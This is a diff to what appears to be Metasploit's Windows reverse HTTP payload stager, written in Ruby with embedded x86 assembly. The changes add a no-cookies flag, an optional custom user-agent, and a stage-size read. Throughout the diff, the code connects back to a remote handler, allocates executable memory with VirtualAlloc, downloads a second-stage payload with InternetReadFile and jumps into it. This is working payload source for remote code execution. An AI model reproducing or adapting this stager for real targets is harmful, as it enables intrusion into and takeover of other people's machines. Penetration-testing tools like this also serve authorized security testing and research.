@@ -1,11 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/block_api'
-require 'msf/core/payload/windows/exitfunk'
-require 'msf/core/payload/uuid/options'
-
 module Msf
 
 ###
@@ -49,7 +43,7 @@ module Payload::Windows::ReverseHttp
     }
 
     # Add extra options if we have enough space
-    if self.available_space.nil? || required_space <= self.available_space
+    if self.available_space.nil? || (cached_size && required_space <= self.available_space)
       conf[:url]            = luri + generate_uri(opts)
       conf[:exitfunk]       = ds['EXITFUNC']
       conf[:ua]             = ds['HttpUserAgent']
@@ -218,6 +212,7 @@ module Payload::Windows::ReverseHttp
         0x04000000 | # INTERNET_NO_CACHE_WRITE
         0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
         0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00080000 | # INTERNET_FLAG_NO_COOKIES
         0x00000200 | # INTERNET_FLAG_NO_UI
         0x00800000 | # INTERNET_FLAG_SECURE
         0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
@@ -235,6 +230,7 @@ module Payload::Windows::ReverseHttp
         0x04000000 | # INTERNET_NO_CACHE_WRITE
         0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
         0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00080000 | # INTERNET_FLAG_NO_COOKIES
         0x00000200 ) # INTERNET_FLAG_NO_UI
     end
 
@@ -255,32 +251,43 @@ module Payload::Windows::ReverseHttp
         xor ebx, ebx           ; Set ebx to NULL to use in future arguments
     ^
 
+    asm << %Q^
+    internetopen:
+      push ebx               ; DWORD dwFlags
+    ^
     if proxy_enabled
       asm << %Q^
-      internetopen:
-        push ebx               ; DWORD dwFlags
         push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
       call get_proxy_server
         db "#{proxy_info}", 0x00
       get_proxy_server:
                                ; LPCTSTR lpszProxyName (via call)
         push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
-        push ebx               ; LPCTSTR lpszAgent (NULL)
-        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
-        call ebp
       ^
     else
       asm << %Q^
-      internetopen:
-        push ebx               ; DWORD dwFlags
         push ebx               ; LPCTSTR lpszProxyBypass (NULL)
         push ebx               ; LPCTSTR lpszProxyName (NULL)
         push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
-        push ebx               ; LPCTSTR lpszAgent (NULL)
-        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
-        call ebp
       ^
     end
+    if opts[:ua].nil?
+      asm << %Q^
+        push ebx               ; LPCTSTR lpszAgent (NULL)
+      ^
+    else
+      asm << %Q^
+        push ebx               ; LPCTSTR lpszProxyBypass (NULL)
+      call get_useragent
+        db "#{opts[:ua]}", 0x00
+                               ; LPCTSTR lpszAgent (via call)
+      get_useragent:
+      ^
+    end
+    asm << %Q^
+      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
+      call ebp
+    ^
 
     asm << %Q^
       internetconnect:
@@ -440,7 +447,49 @@ module Payload::Windows::ReverseHttp
       ^
     end
 
-    asm << %Q^
+    if defined?(read_stage_size?) && read_stage_size?
+      asm << %Q^
+    allocate_memory:
+    read_stage_size:
+      push ebx               ; temporary storage for stage size
+      mov eax, esp           ; pointer to 4b buffer for stage size
+      push ebx               ; temporary storage for bytesRead
+      mov edi, esp           ; pointer to 4b buffer for bytesRead
+      push edi               ; &bytesRead
+      push 4                 ; bytes to read
+      push eax               ; &stage size
+      push esi               ; hRequest
+      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
+      call ebp               ; InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead)
+      pop ebx                ; bytesRead (unused, pop for cleaning)
+      pop ebx                ; stage size
+      test eax,eax           ; download failed? (optional?)
+      jz failure
+      xor eax, eax
+      push 0x40              ; PAGE_EXECUTE_READWRITE
+      push 0x1000            ; MEM_COMMIT
+      push ebx               ; Stage allocation
+      push eax               ; NULL as we dont care where the allocation is
+      push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+    download_prep:
+      xchg eax, ebx          ; place the allocated base address in ebx
+      push ebx               ; store a copy of the stage base address on the stack (for ret later)
+      push ebx               ; temporary storage for bytes read count
+      mov edi, esp           ; &bytesRead
+    download_more:
+      push edi               ; &bytesRead
+      push eax               ; read length
+      push ebx               ; buffer
+      push esi               ; hRequest
+      push #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
+      call ebp
+      test eax,eax           ; download failed? (optional?)
+      jz failure
+      pop eax                ; clear the temporary storage for bytesread
+    ^
+    else
+      asm << %Q^
     allocate_memory:
       push 0x40              ; PAGE_EXECUTE_READWRITE
       push 0x1000            ; MEM_COMMIT
@@ -472,7 +521,9 @@ module Payload::Windows::ReverseHttp
       test eax,eax           ; optional?
       jnz download_more      ; continue until it returns 0
       pop eax                ; clear the temporary storage
-
+      ^
+      end
+    asm << %Q^
     execute_stage:
       ret                    ; dive into the stored stage address
 
